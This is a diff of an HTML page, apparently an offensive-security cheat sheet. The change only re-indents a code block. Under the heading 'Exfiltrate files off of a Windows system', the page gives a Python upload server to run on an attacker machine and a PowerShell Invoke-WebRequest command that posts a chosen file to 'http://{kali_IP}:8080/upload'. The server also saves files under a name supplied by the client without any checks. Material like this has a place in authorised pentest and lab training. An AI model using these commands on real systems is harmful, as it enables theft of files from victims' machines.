@@ -77,32 +77,33 @@
     </code></pre>
     <p>Exfiltrate files off of a Windows system
     <code>sudo python3 app.py</code></p>
-    <pre><code>#!/usr/bin/env python3
-    from http.server import SimpleHTTPRequestHandler, HTTPServer
-    import os
-    
-    class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
-        def do_POST(self):
-            content_length = int(self.headers[&#39;Content-Length&#39;])
-            post_data = self.rfile.read(content_length)
-    
-            # Get the filename from the POST headers if provided
-            filename = self.headers.get(&#39;filename&#39;, &#39;upload.bin&#39;)
-    
-            # Save the uploaded file
-            with open(filename, &#39;wb&#39;) as f:
-                f.write(post_data)
-    
-            # Send a response back to the client
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(b&#39;File uploaded successfully&#39;)
-    
-    if __name__ == &quot;__main__&quot;:
-        server_address = (&#39;0.0.0.0&#39;, 8080)  # Use any port you want
-        httpd = HTTPServer(server_address, FileUploadHTTPRequestHandler)
-        print(f&quot;Serving HTTP on {server_address[0]} port {server_address[1]} (http://{server_address[0]}:{server_address[1]}/)&quot;)
-        httpd.serve_forever()
+    <pre><code>
+#!/usr/bin/env python3
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+import os
+
+class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers[&#39;Content-Length&#39;])
+        post_data = self.rfile.read(content_length)
+
+        # Get the filename from the POST headers if provided
+        filename = self.headers.get(&#39;filename&#39;, &#39;upload.bin&#39;)
+
+        # Save the uploaded file
+        with open(filename, &#39;wb&#39;) as f:
+            f.write(post_data)
+
+        # Send a response back to the client
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b&#39;File uploaded successfully&#39;)
+
+if __name__ == &quot;__main__&quot;:
+    server_address = (&#39;0.0.0.0&#39;, 8080)  # Use any port you want
+    httpd = HTTPServer(server_address, FileUploadHTTPRequestHandler)
+    print(f&quot;Serving HTTP on {server_address[0]} port {server_address[1]} (http://{server_address[0]}:{server_address[1]}/)&quot;)
+    httpd.serve_forever()
     </code></pre>
     <p><code>Invoke-WebRequest -Uri &quot;http://{kali_IP}:8080/upload&quot; -Method Post -InFile &quot;{filename}&quot; -Headers @{&quot;filename&quot;=&quot;{filename}&quot;} -UseBasicParsing</code></p>
     
